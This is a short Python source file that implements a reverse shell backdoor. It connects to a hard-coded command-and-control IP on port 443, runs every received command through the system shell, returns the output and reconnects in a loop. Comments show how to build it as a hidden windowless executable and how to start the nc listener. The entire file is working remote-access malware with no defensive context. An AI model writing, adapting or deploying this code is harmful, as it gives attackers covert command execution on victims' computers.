import socket
import subprocess
import threading
import time
import os

# pyinstaller -F --clean -w main.py
#sudo nc -lvp 443


CCIP = "192.168.43.197"
CCPORT = 443 #SSL Conection

def conn(CCIP, CCPORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((CCIP, CCPORT))
        return client
    except Exception as error:
        print(error)

def cmd(client, data):
    try:
        proc = subprocess.Popen(data, shell=True,stdin=subprocess.PIPE,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b"\n")
    except Exception as error:
        print(error)


def cli(client):
    try:
        while True:
            data = client.recv(1024)
            if data == "/kill":
                return
            else:
                threading.Thread(target=cmd, args=(client, data)).start()

    except Exception as error:
        client.close()
        print(error)

if __name__ == "__main__":
    while True:
        client = conn(CCIP, CCPORT)
        if client:
            cli(client)
        else:
            time.sleep(3)
